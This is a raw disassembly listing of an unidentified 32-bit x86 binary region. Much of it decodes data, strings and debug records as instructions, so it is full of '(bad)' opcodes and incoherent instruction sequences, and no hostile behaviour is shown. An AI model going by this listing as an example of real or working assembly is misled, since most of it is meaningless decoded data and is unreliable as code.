  434213:	fadd   QWORD PTR [ebp+0x9]
  434216:	call   0xffd03cea
  43421b:	dec    ecx
  43421c:	dec    ebp
  43421d:	xor    bh,BYTE PTR [ebx]
  43421f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  434223:	loopne 0x434221
  434225:	or     edi,eax
  434227:	iret   
  434228:	ret    
  434229:	mov    WORD PTR [ebp+0x4d],es
  43422c:	mov    esi,DWORD PTR [edx]
  43422e:	call   0x8453096d
  434233:	(bad)  
  434234:	cdq    
  434235:	add    BYTE PTR [edx],dh
  434237:	mov    esi,DWORD PTR [ebx]
  434239:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43423f:	test   BYTE PTR [ebx],dh
  434241:	dec    ecx
  434242:	add    esi,DWORD PTR [edx]
  434244:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43424a:	dec    edi
  43424c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  434253:	xor    al,BYTE PTR [ebx]
  434255:	mov    edi,DWORD PTR [ebx]
  434257:	in     al,0x75
  434259:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43425f:	dec    ecx
  434260:	xor    esi,DWORD PTR [edx]
  434262:	lea    ecx,[edx]
  434264:	or     BYTE PTR [ebx+0x900f072],cl
  43426a:	ja     0x43423b
  43426c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  434273:	cmp    ch,al
  434275:	jne    0x43426a
  434277:	mov    edi,edi
  434279:	fadd   QWORD PTR [ebp+0x0]
  43427c:	mov    eax,edi
  43427e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434285:	mov    edx,DWORD PTR [ebx]
  434287:	in     al,0x45
  434289:	or     DWORD PTR [ebx],esi
  43428b:	iret   
  43428c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434293:	xor    dl,BYTE PTR [eax-0x75]
  434296:	sbb    al,0xe0
  434298:	dec    DWORD PTR [ecx]
  43429a:	mov    ecx,edi
  43429c:	in     al,dx
  43429d:	mov    eax,es
  43429f:	dec    ecx
  4342a0:	mov    DWORD PTR [edx],esi
  4342a2:	fmul   QWORD PTR [edx]
  4342a4:	jne    0x434231
  4342a6:	(bad)  
  4342a7:	(bad)  
  4342a9:	or     DWORD PTR [ebp-0x31],eax
  4342ac:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  4342b3:	cmp    bh,bh
  4342b5:	jne    0x4342fc
  4342b7:	lea    ecx,[ebx-0x38372750]
  4342bd:	inc    ebx
  4342bf:	mov    eax,ecx
  4342c1:	mov    eax,0xa00c111
  4342c6:	jne    0x43430d
  4342c8:	mov    esi,DWORD PTR [ebx]
  4342ca:	test   al,0x3
  4342cc:	inc    ebp
  4342cd:	mov    DWORD PTR [eax-0xc],edx
  4342d0:	loop   0x434317
  4342d2:	push   DWORD PTR [ebx]
  4342d4:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4342da:	add    DWORD PTR [eax],eax
  4342dc:	mov    eax,edi
  4342de:	lods   al,BYTE PTR ds:[esi]
  4342df:	dec    ebp
  4342e0:	inc    ebp
  4342e1:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4342e7:	retf   
  4342e8:	mov    edx,ecx
  4342ea:	adc    al,0x84
  4342ec:	(bad)  
  4342ed:	std    
  4342ee:	ret    
  4342ef:	jmp    FWORD PTR [edi-0x2b7474bb]
  4342f5:	hlt    
  4342f6:	rol    edi,0x82
  4342f9:	ret    
  4342fa:	cld    
  4342fb:	enter  0x11ff,0x45
  4342ff:	inc    ebp
  434300:	pop    edi
  434301:	mov    ebx,DWORD PTR [ebx+0x14]
  434304:	ret    0xc7
  434307:	test   BYTE PTR [ebx+0x45325199],cl
  43430d:	jmp    0x43429a
  43430f:	push   0x8
  434311:	call   DWORD PTR [esi]
  434313:	in     al,dx
  434314:	add    BYTE PTR [ebp+0x1],0x50
  434318:	add    bh,ah
  43431a:	add    bh,bh
  43431c:	icebp  
  43431d:	mov    ecx,DWORD PTR [eax]
  43431f:	cld    
  434320:	pop    es
  434321:	dec    ebp
  434322:	shl    DWORD PTR [ebx],0x72
  434325:	add    eax,DWORD PTR [eax]
  434327:	cmp    edx,ecx
  434329:	je     0x43433b
  43432b:	mov    esi,DWORD PTR [ebp-0x4]
  43432e:	inc    edi
  434330:	or     al,0xc3
  434332:	jmp    FWORD PTR [edx-0x18]
  434335:	(bad)  
  434336:	sti    
  434337:	cwde   
  434338:	(bad)  
  434339:	call   0xffa13c44
  43433e:	or     al,0x45
  434340:	push   ebp
  434341:	sub    esp,0x18
  434344:	push   ebx
  434345:	inc    ebp
  434346:	mov    edi,edi
  434348:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43434f:	test   al,0x51
  434351:	inc    ebp
  434352:	push   ecx
  434353:	push   eax
  434354:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43435a:	add    ah,bh
  43435c:	(bad)  
  43435d:	dec    ebp
  43435e:	add    DWORD PTR [ebx],esi
  434360:	inc    ebp
  434361:	add    ecx,DWORD PTR [ebx+0x74943b]
  434367:	push   0xffffff8b
  434369:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43436f:	add    eax,DWORD PTR [ecx]
  434371:	or     BYTE PTR [eax],al
  434373:	call   0xff853b78
  434378:	mov    eax,DWORD PTR [ebp+0x14]
  43437b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434381:	inc    ebp
  434382:	dec    ecx
  434383:	add    ebp,DWORD PTR [edx+0x14]
  434386:	push   0x8b3045
  43438b:	call   0x33ad9100
  434390:	inc    DWORD PTR [ebx]
  434392:	mov    DWORD PTR [edi],ecx
  434394:	mov    eax,ecx
  434396:	or     BYTE PTR [ebp-0x3d],cl
  434399:	cmp    eax,edi
  43439b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4343a0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4343a6:	adc    al,0xc9
  4343a8:	inc    ebp
  4343a9:	adc    BYTE PTR [eax+0x55],dl
  4343ac:	jne    0x43439a
  4343ae:	call   0xff54433e
  4343b3:	dec    ebp
  4343b4:	inc    ebp
  4343b5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4343bb:	add    BYTE PTR [ebx],bh
  4343bd:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4343c1:	push   ecx
  4343c2:	or     al,0x51
  4343c4:	dec    ebp
  4343c5:	xor    DWORD PTR [ebx],0xf320399
  4343cb:	cmp    eax,DWORD PTR [ebp+0x74]
  4343ce:	mov    edi,edi
  4343d0:	pop    edi
  4343d1:	adc    BYTE PTR [ebx+0x75],bl
  4343d4:	ret    0x50
  4343d7:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4343db:	(bad)  
  4343dc:	clc    
  4343dd:	mov    esp,ebp
  4343df:	pop    ecx
  4343e0:	mov    ecx,0xf80085c2
  4343e5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4343e8:	push   esi
  4343e9:	push   esi
  4343ea:	(bad)  
  4343eb:	lock add eax,DWORD PTR [ebp+0x44]
  4343ef:	mov    edx,DWORD PTR [eax]
  4343f1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4343f5:	or     BYTE PTR [ecx+0x7],dl
  4343f8:	push   ecx
  4343f9:	ret    
  4343fa:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434400:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434406:	or     al,0x80
  434408:	jge    0x43440b
  43440a:	mov    DWORD PTR [eax],eax
  43440c:	and    al,0x8
  43440e:	cmp    DWORD PTR [ebp+0x10],eax
  434411:	mov    edx,DWORD PTR [esi]
  434413:	xchg   esp,eax
  434414:	dec    esp
  434415:	add    BYTE PTR [eax],dl
  434417:	mov    ecx,edx
  434419:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43441d:	dec    ebp
  43441e:	into   
  43441f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  434425:	mov    edx,DWORD PTR [eax+0x14]
  434428:	das    
  434429:	add    al,0x45
  43442b:	add    BYTE PTR [ebp+0x0],dh
  43442e:	mov    edi,edi
  434430:	and    al,0x50
  434432:	mov    eax,DWORD PTR [eax]
  434434:	and    al,0xd1
  434436:	xor    eax,DWORD PTR [esi]
  434438:	lea    eax,[ebp+0x8]
  43443b:	xor    esi,DWORD PTR [edx+0x3]
  43443e:	add    BYTE PTR [ecx+0x4510fc44],cl
  434444:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  43444a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  434454:	cmp    edi,edi
  434456:	pushf  
  434457:	mov    edi,edi
  434459:	or     BYTE PTR [esi+ecx*1],cl
  43445c:	jne    0x434421
  43445e:	call   0xc442a
  434463:	adc    BYTE PTR [ebp+eax*2+0xc],al
  434467:	mov    ebx,DWORD PTR [eax]
  434469:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43446d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  434475:	pop    esi
  434476:	(bad)  
  434477:	leave  
  434478:	call   DWORD PTR [eax]
  43447a:	call   DWORD PTR [ebp+0x24]
  43447d:	in     al,dx
  43447e:	jmp    esp
  434480:	and    al,0x83
  434482:	call   0xff7a4297
  434487:	pushf  
  434488:	inc    esp
  434489:	mov    DWORD PTR [esp],ecx
  43448c:	pop    esi
  43448d:	push   edi
  43448e:	in     eax,0x41
  434490:	ret    0x89
  434493:	and    al,0xe
  434495:	mov    edi,DWORD PTR [eax]
  434497:	and    al,0x75
  434499:	mov    edx,0x7750885
  43449e:	or     dl,bh
  4344a0:	call   FWORD PTR [ecx+0x3243224]
  4344a6:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  4344ac:	dec    DWORD PTR [esp]
  4344af:	jl     0x43443c
  4344b1:	adc    al,0xc
  4344b3:	dec    ebp
  4344b4:	cmp    DWORD PTR [ebp+0x1c],esi
  4344b7:	mov    ecx,DWORD PTR [eax]
  4344b9:	and    al,0x10
  4344bb:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  4344c2:	test   DWORD PTR [edi],ecx
  4344c4:	jge    0x434490
  4344c6:	push   0x8908ff4c
  4344cb:	jmp    0x4344f1
  4344cd:	adc    BYTE PTR [esp+eax*2-0x75],dh
  4344d1:	dec    esp
  4344d2:	pop    ebp
  4344d3:	ret    0x8999
  4344d6:	push   0x74f89cf8
  4344db:	jmp    0x434551
  4344dd:	mov    edi,0x104fd55f
  4344e2:	add    BYTE PTR [eax],dh
  4344e4:	adc    BYTE PTR ds:[eax],al
  4344e7:	or     edx,DWORD PTR gs:[eax]
  4344ea:	add    BYTE PTR [ecx],ch
  4344ec:	add    eax,0x35270010
  4344f1:	adc    BYTE PTR [eax],al
  4344f3:	std    
  4344f4:	dec    eax
  4344f5:	adc    BYTE PTR [eax],al
  4344f7:	(bad)  
  4344f8:	outs   dx,BYTE PTR ds:[esi]
  4344f9:	adc    BYTE PTR [eax],al
  4344fb:	sahf   
  4344fc:	xor    DWORD PTR [eax],edx
  4344fe:	add    BYTE PTR [esi+0x0],al
  434501:	adc    BYTE PTR [eax],al
  434503:	fs jae 0x434516
  434506:	add    BYTE PTR [ebx-0x20ffefac],bh
  43450c:	inc    esp
  43450d:	inc    ebx
  43450e:	add    bl,ah
  434510:	inc    esp
  434511:	inc    ebx
  434512:	add    bh,ah
  434514:	inc    esp
  434515:	inc    ebx
  434516:	add    bl,ch
  434518:	inc    esp
  434519:	inc    ebx
  43451a:	add    bh,ch
  43451c:	inc    esp
  43451d:	inc    ebx
  43451e:	add    bl,dh
  434520:	inc    esp
  434521:	inc    ebx
  434522:	add    bh,dh
  434524:	inc    esp
  434525:	inc    ebx
  434526:	add    bl,bh
  434528:	inc    esp
  434529:	inc    ebx
  43452a:	add    bh,bh
  43452c:	inc    esp
  43452d:	inc    ebx
  43452e:	add    BYTE PTR [ebx],al
  434530:	inc    ebp
  434531:	inc    ebx
  434532:	add    BYTE PTR [edi],al
  434534:	inc    ebp
  434535:	inc    ebx
  434536:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  43453d:	adc    BYTE PTR [eax],al
  43453f:	adc    dh,BYTE PTR [ecx+0x10]
  434542:	add    BYTE PTR [edi+0x2c001065],al
  434548:	push   0x5aa20010
  43454d:	adc    BYTE PTR [eax],al
  43454f:	rol    DWORD PTR [eax+edx*1],0x0
  434553:	int    0x6f
  434555:	adc    BYTE PTR [eax],al
  434557:	aaa    
  434558:	inc    ebp
  434559:	inc    ebx
  43455a:	add    BYTE PTR [ebx],bh
  43455c:	inc    ebp
  43455d:	inc    ebx
  43455e:	add    BYTE PTR [edi],bh
  434560:	inc    ebp
  434561:	inc    ebx
  434562:	add    BYTE PTR [ebx+0x45],al
  434565:	inc    ebx
  434566:	add    BYTE PTR [edi+0x45],al
  434569:	inc    ebx
  43456a:	add    BYTE PTR [ebx+0x45],cl
  43456d:	inc    ebx
  43456e:	add    BYTE PTR [edi+0x45],cl
  434571:	inc    ebx
  434572:	add    BYTE PTR [ebx+0x45],dl
  434575:	inc    ebx
  434576:	add    BYTE PTR [ebx+0x54001005],dh
  43457c:	push   ebp
  43457d:	adc    BYTE PTR [eax],al
  43457f:	sbb    bh,BYTE PTR [eax]
  434581:	adc    BYTE PTR [eax],al
  434583:	mov    edx,0x2f001013
  434588:	dec    edx
  434589:	adc    BYTE PTR [eax],al
  43458b:	inc    ecx
  43458c:	or     edx,DWORD PTR [eax]
  43458e:	add    BYTE PTR [ebx+0x19],ch
  434591:	adc    BYTE PTR [eax],al
  434593:	mov    esp,0x7700103e
  434598:	inc    ebp
  434599:	inc    ebx
  43459a:	add    BYTE PTR [ebx+0x45],bh
  43459d:	inc    ebx
  43459e:	add    BYTE PTR [edi+0x45],bh
  4345a1:	inc    ebx
  4345a2:	add    BYTE PTR [ebx-0x78ffbcbb],al
  4345a8:	inc    ebp
  4345a9:	inc    ebx
  4345aa:	add    BYTE PTR [ebx-0x70ffbcbb],cl
  4345b0:	inc    ebp
  4345b1:	inc    ebx
  4345b2:	add    BYTE PTR [ebx-0x50ffbcbb],dl
  4345b8:	push   0x10
  4345ba:	add    al,bl
  4345bc:	imul   edx,DWORD PTR [eax],0x0
  4345bf:	sahf   
  4345c0:	push   ss
  4345c1:	adc    BYTE PTR [eax],al
  4345c3:	jle    0x4345ff
  4345c5:	adc    BYTE PTR [eax],al
  4345c7:	jbe    0x4345de
  4345c9:	adc    BYTE PTR [eax],al
  4345cb:	cmp    DWORD PTR [edi+0x10],edx
  4345ce:	add    BYTE PTR [ebp+0x59001066],bl
  4345d4:	adc    al,0x10
  4345d6:	add    BYTE PTR [edi-0x44ffbcbb],dh
  4345dc:	inc    ebp
  4345dd:	inc    ebx
  4345de:	add    BYTE PTR [edi-0x3cffbcbb],bh
  4345e4:	inc    ebp
  4345e5:	inc    ebx
  4345e6:	add    bh,al
  4345e8:	inc    ebp
  4345e9:	inc    ebx
  4345ea:	add    bl,cl
  4345ec:	inc    ebp
  4345ed:	inc    ebx
  4345ee:	add    bh,cl
  4345f0:	inc    ebp
  4345f1:	inc    ebx
  4345f2:	add    bl,dl
  4345f4:	inc    ebp
  4345f5:	inc    ebx
  4345f6:	add    BYTE PTR [ebx-0x6affef90],bh
  4345fc:	inc    ebp
  4345fd:	adc    BYTE PTR [eax],al
  4345ff:	dec    ebx
  434600:	dec    eax
  434601:	adc    BYTE PTR [eax],al
  434603:	dec    ebx
  434604:	popa   
  434605:	adc    BYTE PTR [eax],al
  434607:	adc    al,BYTE PTR [eax+edx*1]
  43460a:	add    dh,dl
  43460c:	push   ds
  43460d:	adc    BYTE PTR [eax],al
  43460f:	hlt    
  434610:	pop    ds
  434611:	adc    BYTE PTR [eax],al
  434613:	dec    ecx
  434614:	pop    eax
  434615:	adc    BYTE PTR [eax],al
  434617:	test   DWORD PTR [ebp+0x43],0x4345fb00
  43461e:	add    bh,bh
  434620:	inc    ebp
  434621:	inc    ebx
  434622:	add    BYTE PTR [ebx],al
  434624:	inc    esi
  434625:	inc    ebx
  434626:	add    BYTE PTR [edi],al
  434628:	inc    esi
  434629:	inc    ebx
  43462a:	add    BYTE PTR [ebx],cl
  43462c:	inc    esi
  43462d:	inc    ebx
  43462e:	add    BYTE PTR [edi],cl
  434630:	inc    esi
  434631:	inc    ebx
  434632:	add    BYTE PTR [ebx],dl
  434634:	inc    esi
  434635:	inc    ebx
  434636:	add    BYTE PTR [ebp+0x57],cl
  434639:	xor    DWORD PTR [ecx],esi
  43463b:	cmp    BYTE PTR [edi+ebx*2],dh
  43463e:	push   ecx
  43463f:	add    BYTE PTR [edx+0x33],dl
  434642:	push   esi
  434643:	xor    eax,0x3849515f
  434648:	xor    al,0x59
  43464a:	push   edi
  43464b:	add    BYTE PTR [ebx+0x54],al
  43464e:	inc    ebp
  43464f:	pop    edi
  434650:	dec    ebx
  434651:	push   edx
  434652:	push   ebp
  434653:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  434658:	pop    edi
  434659:	aaa    
  43465a:	xor    al,0x32
  43465c:	xor    BYTE PTR [edi+0x5f],al
  43465f:	inc    ebx
  434660:	pop    edx
  434661:	add    BYTE PTR [edi+0x4e],al
  434664:	cmp    DWORD PTR [edi+0x47],ebx
  434667:	push   ebx
  434668:	cmp    DWORD PTR [edi+0x4e],edx
  43466b:	add    BYTE PTR [ecx+0x44],dl
  43466e:	cmp    BYTE PTR [edi+0x33],bl
  434671:	cmp    BYTE PTR [eax],dh
  434673:	pop    edi
  434674:	inc    ecx
  434675:	dec    edi
  434676:	inc    esi
  434677:	push   eax
  434678:	add    BYTE PTR [edx+0x43],dl
  43467b:	xor    eax,0x41305f30
  434680:	xor    BYTE PTR [esi+0x5f],al
  434683:	inc    ebx
  434684:	xor    dh,BYTE PTR [edx]
  434686:	xor    eax,0x36545200
  43468b:	xor    al,0x5f
  43468d:	dec    esi
  43468e:	xor    esi,DWORD PTR [edx]
  434690:	add    BYTE PTR ss:[eax+0x4b],cl
  434694:	inc    ebx
  434695:	pop    edi
  434696:	ss xor al,0x34
  434699:	pop    edi
  43469a:	inc    ecx
  43469b:	push   esp
  43469c:	dec    edi
  43469d:	add    BYTE PTR [esi+0x52],dl
  4346a0:	push   esi
  4346a1:	pop    edi
  4346a2:	inc    esi
  4346a3:	push   ecx
  4346a4:	push   ebp
  4346a5:	push   edx
  4346a6:	dec    eax
  4346a7:	add    BYTE PTR [esi+0x41],cl
  4346aa:	inc    edx
  4346ab:	pop    edi
  4346ac:	xor    DWORD PTR [ecx],edi
  4346ae:	push   edi
  4346af:	pop    edi
  4346b0:	pop    edx
  4346b1:	xor    eax,0x47003934
  4346b6:	push   edx
  4346b7:	push   ebp
  4346b8:	pop    edi
  4346b9:	xor    al,BYTE PTR [edx+0x30]
  4346bc:	push   ebx
  4346bd:	dec    esi
  4346be:	xor    eax,0x38564300
  4346c3:	xor    al,0x5f
  4346c5:	xor    bl,BYTE PTR [eax+0x36]
  4346c8:	inc    edx
  4346c9:	pop    edi
  4346ca:	pop    ecx
  4346cb:	xor    al,BYTE PTR [ecx+0x0]
  4346ce:	push   edi
  4346cf:	dec    ecx
  4346d0:	push   ebx
  4346d1:	xor    DWORD PTR [eax],edi
  4346d3:	pop    edi
  4346d4:	push   ecx
  4346d5:	xor    BYTE PTR [edx+0x5f],cl
  4346d8:	inc    ecx
  4346d9:	add    BYTE PTR ss:[edx+0x45],al
  4346dd:	push   edi
  4346de:	cmp    DWORD PTR [eax],edi
  4346e0:	pop    edi
  4346e1:	inc    edx
  4346e2:	xor    eax,0x36520057
  4346e7:	aaa    
  4346e8:	xor    BYTE PTR [edi],dh
  4346ea:	pop    edi
  4346eb:	inc    edx
  4346ec:	cmp    DWORD PTR [edi+0x52],eax
  4346ef:	dec    esp
  4346f0:	pop    edi
  4346f1:	dec    ebx
  4346f2:	add    BYTE PTR [esp+edx*2+0x30],al
  4346f6:	pop    edi
  4346f7:	push   ebp
  4346f8:	push   ebx
  4346f9:	aaa    
  4346fa:	dec    ebp
  4346fb:	pop    edi
  4346fc:	xor    ecx,DWORD PTR [edx+0x4e]
  4346ff:	dec    ebx
  434700:	dec    edx
  434701:	add    BYTE PTR [edi+0x47],al
  434704:	xor    eax,0x534e5f32
  434709:	push   esp
  43470a:	pop    edi
  43470b:	push   esp
  43470c:	inc    edx
  43470d:	inc    esi
  43470e:	inc    esp
  43470f:	add    BYTE PTR [ebp+0x4e],al
  434712:	inc    edi
  434713:	cmp    DWORD PTR [edi+0x57],ebx
  434716:	push   eax
  434717:	push   ecx
  434718:	pop    edi
  434719:	dec    edi
  43471a:	inc    ebx
  43471b:	push   edi
  43471c:	pop    edi
  43471d:	inc    edi
  43471e:	add    BYTE PTR [edi+0x45],dl
  434721:	inc    esi
  434722:	pop    edi
  434723:	push   edx
  434724:	inc    edx
  434725:	pop    eax
  434726:	inc    edi
  434727:	ss pop edi
  434729:	push   esi
  43472a:	inc    ebx
  43472b:	dec    esi
  43472c:	inc    esp
  43472d:	add    BYTE PTR [edi+0x4d],cl
  434730:	inc    edi
  434731:	xor    ebx,DWORD PTR [edi+0x34]
  434734:	dec    esi
  434735:	pop    edx
  434736:	cmp    BYTE PTR [edi+0x58],bl
  434739:	cmp    BYTE PTR [eax],al
  43473b:	push   edx
  43473c:	pop    eax
  43473d:	push   ecx
  43473e:	pop    edi
  43473f:	dec    esp
  434740:	push   edx
  434741:	dec    ecx
  434742:	dec    edi
  434743:	inc    esp
  434744:	pop    edi
  434745:	dec    edi
  434746:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43474a:	push   eax
  43474b:	inc    ebp
  43474c:	pop    edi
  43474d:	xor    eax,0x565f3945
  434752:	add    BYTE PTR [edi+0x4e],al
  434755:	push   esi
  434756:	pop    edi
  434757:	inc    edi
  434758:	push   esp
  434759:	dec    eax
  43475a:	xor    dh,BYTE PTR [ecx]
  43475c:	pop    edi
  43475d:	dec    edi
  43475e:	xor    eax,DWORD PTR ss:[eax]
  434761:	inc    esp
  434762:	inc    ebp
  434763:	dec    ecx
  434764:	pop    edi
  434765:	push   edx
  434766:	dec    eax
  434767:	xor    al,0x48
  434769:	dec    ecx
  43476a:	ss pop edi
  43476c:	aaa    
  43476d:	aaa    
  43476e:	dec    ecx
  43476f:	dec    ebp
  434770:	add    BYTE PTR [eax+0x54],cl
  434773:	ss pop edi
  434775:	inc    esi
  434776:	inc    edx
  434777:	xor    dh,BYTE PTR [eax+eax*1]
  43477a:	dec    esi
  43477b:	ss dec edx
  43477d:	pop    edi
  43477e:	dec    ecx
  43477f:	dec    esp
  434780:	inc    edi
  434781:	inc    esp
  434782:	dec    eax
  434783:	xor    BYTE PTR [eax],bh
  434785:	xor    eax,0x34004f00
  43478a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43478e:	add    BYTE PTR [edi],dh
  434790:	add    BYTE PTR [eax],dh
  434792:	add    BYTE PTR [edi+0x0],bl
  434795:	inc    esp
  434796:	add    BYTE PTR [edi+0x0],al
  434799:	dec    ebx
  43479a:	add    BYTE PTR [edx],dh
  43479c:	add    BYTE PTR [ecx+0x0],al
  43479f:	inc    ebx
  4347a0:	add    BYTE PTR [eax],al
  4347a2:	add    BYTE PTR [edi+0x0],cl
  4347a5:	xor    al,BYTE PTR [eax]
  4347a7:	xor    eax,DWORD PTR [eax]
  4347a9:	pop    edi
  4347aa:	add    BYTE PTR [edi+0x0],dl
  4347ad:	xor    al,BYTE PTR [eax]
  4347af:	dec    edi
  4347b0:	add    BYTE PTR [edi+0x0],bl
  4347b3:	pop    edx
  4347b4:	add    BYTE PTR [eax],al
  4347b6:	add    BYTE PTR [eax+0x0],bl
  4347b9:	dec    esp
  4347ba:	add    BYTE PTR [ecx],bh
  4347bc:	add    BYTE PTR [edi+0x0],bl
  4347bf:	dec    ebx
  4347c0:	add    BYTE PTR [ecx+0x0],al
  4347c3:	dec    edx
  4347c4:	add    BYTE PTR [esi+0x0],al
  4347c7:	xor    DWORD PTR [eax],eax
  4347c9:	xor    al,0x0
  4347cb:	pop    edi
  4347cc:	add    BYTE PTR [eax+0x0],bl
  4347cf:	inc    edi
  4347d0:	add    BYTE PTR [edx+0x0],al
  4347d3:	add    BYTE PTR [eax],al
  4347d5:	push   eax
  4347d6:	add    BYTE PTR [ebx],dh
  4347d8:	add    BYTE PTR [esi+0x0],cl
  4347db:	pop    edi
  4347dc:	add    BYTE PTR [eax+0x0],cl
  4347df:	xor    eax,0x5f005300
  4347e4:	add    BYTE PTR [eax+0x0],cl
  4347e7:	add    BYTE PTR [eax],al
  4347e9:	dec    ebp
  4347ea:	add    BYTE PTR [eax],dh
  4347ec:	add    BYTE PTR [edx+0x0],al
  4347ef:	pop    edi
  4347f0:	add    BYTE PTR [edx+0x0],cl
  4347f3:	pop    eax
  4347f4:	add    BYTE PTR [eax+eax*1+0x49],dl
  4347f8:	add    BYTE PTR [eax+eax*1+0x39],cl
  4347fc:	add    BYTE PTR [eax+eax*1+0x0],cl
  434800:	add    BYTE PTR [ecx+0x0],al
  434803:	xor    eax,DWORD PTR [eax]
  434805:	xor    BYTE PTR [eax],al
  434807:	pop    edi
  434808:	add    BYTE PTR [ecx+0x0],al
  43480b:	pop    edx
  43480c:	add    BYTE PTR [ecx+0x0],dl
  43480f:	pop    edx
  434810:	add    BYTE PTR [ecx],bh
  434812:	add    BYTE PTR [esi],dh
  434814:	add    BYTE PTR [edi+0x0],bl
  434817:	dec    eax
  434818:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43481c:	add    BYTE PTR [eax],al
  43481e:	add    BYTE PTR [ecx+0x0],dl
  434821:	push   edi
  434822:	add    BYTE PTR [ecx+0x0],bl
  434825:	pop    edi
  434826:	add    BYTE PTR [esi+0x0],dl
  434829:	xor    al,0x0
  43482b:	inc    esp
  43482c:	add    BYTE PTR [ecx],dh
  43482e:	add    BYTE PTR [eax],bh
  434830:	add    BYTE PTR [edx],dh
  434832:	add    BYTE PTR [edi+0x0],bl
  434835:	cmp    DWORD PTR [eax],eax
  434837:	push   esp
  434838:	add    BYTE PTR [eax+eax*1+0x0],dl
  43483c:	add    BYTE PTR [esi+0x0],dl
  43483f:	dec    edi
  434840:	add    BYTE PTR [edi+0x0],al
  434843:	add    BYTE PTR ss:[edi+0x0],bl
  434847:	dec    edi
  434848:	add    BYTE PTR [edx+0x0],bl
  43484b:	inc    ebp
  43484c:	add    BYTE PTR [eax],dh
  43484e:	add    BYTE PTR [ebp+0x0],al
  434851:	xor    BYTE PTR [eax],al
  434853:	pop    edi
  434854:	add    BYTE PTR [eax],dh
  434856:	add    BYTE PTR ds:0x4f000000,dh
  43485c:	add    BYTE PTR ds:0x5f005700,dh
  434862:	add    BYTE PTR [edi],dh
  434864:	add    BYTE PTR [ebx+0x0],dl
  434867:	push   ebp
  434868:	add    BYTE PTR [edi+0x0],al
  43486b:	xor    al,0x0
  43486d:	pop    edi
  43486e:	add    BYTE PTR [ecx+0x0],dl
  434871:	inc    esp
  434872:	add    BYTE PTR [eax],al
  434874:	add    BYTE PTR [edx+0x0],dl
  434877:	push   esp
  434878:	add    BYTE PTR ds:0x52005f00,dh
  43487e:	add    BYTE PTR [edi+0x0],dl
  434881:	xor    al,BYTE PTR [eax]
  434883:	xor    al,BYTE PTR [eax]
  434885:	xor    BYTE PTR [eax],al
  434887:	xor    BYTE PTR [eax],al
  434889:	pop    edi
  43488a:	add    BYTE PTR [esi],dh
  43488c:	add    BYTE PTR [eax],al
  43488e:	add    BYTE PTR [eax+0x0],cl
  434891:	inc    ebp
  434892:	add    BYTE PTR [eax+eax*1+0x30],cl
  434896:	add    BYTE PTR [edi+0x0],bl
  434899:	dec    edx
  43489a:	add    BYTE PTR [edx],dh
  43489c:	add    BYTE PTR [edi],dh
  43489e:	add    BYTE PTR [ebp+0x0],dl
  4348a1:	add    BYTE PTR ss:[eax],dh
  4348a4:	add    BYTE PTR [eax],al
  4348a6:	add    BYTE PTR [esi+0x0],dl
  4348a9:	cmp    BYTE PTR [eax],al
  4348ab:	dec    edi
  4348ac:	add    BYTE PTR [ecx],bh
  4348ae:	add    BYTE PTR [edi+0x0],bl
  4348b1:	pop    eax
  4348b2:	add    BYTE PTR [edx+0x0],bl
  4348b5:	dec    esp
  4348b6:	add    BYTE PTR [ebx+0x0],cl
  4348b9:	add    BYTE PTR [eax],al
  4348bb:	dec    ecx
  4348bc:	add    BYTE PTR [ebp+0x0],dl
  4348bf:	dec    edi
  4348c0:	add    BYTE PTR [eax],al
  4348c2:	add    BYTE PTR [edx+0x53],dl
  4348c5:	inc    esp
  4348c6:	push   ebx
  4348c7:	gs xchg esp,eax
  4348c9:	or     DWORD PTR [esi+0x41],edx
  4348cc:	popa   
  4348cd:	mov    ebx,0xa8be884e
  4348d2:	dec    esp
  4348d3:	(bad)  
  4348d4:	cs (bad) 
  4348d6:	push   ss
  4348d7:	sbb    al,BYTE PTR [eax]
  4348d9:	add    BYTE PTR [eax],al
  4348db:	push   ebx
  4348dc:	cmp    bl,BYTE PTR [ecx+eiz*2+0x76]
  4348e0:	jne    0x43495b
  4348e2:	ins    DWORD PTR es:[edi],dx
  4348e3:	dec    ecx
  4348e4:	jb     0x434960
  4348e6:	pop    esp
  4348e7:	bound  di,DWORD PTR [edx+0x52]
  4348eb:	gs fs push ax
  4348ef:	arpl   WORD PTR [esi+0x5c],si
  4348f2:	js     0x43494e
  4348f4:	je     0x43493d
  4348f6:	jno    0x43493a
  4348f8:	jno    0x434961
  4348fa:	bound  ebp,QWORD PTR [esi]
  4348fc:	jo     0x434962
  4348fe:	bound  eax,QWORD PTR [eax]
	...
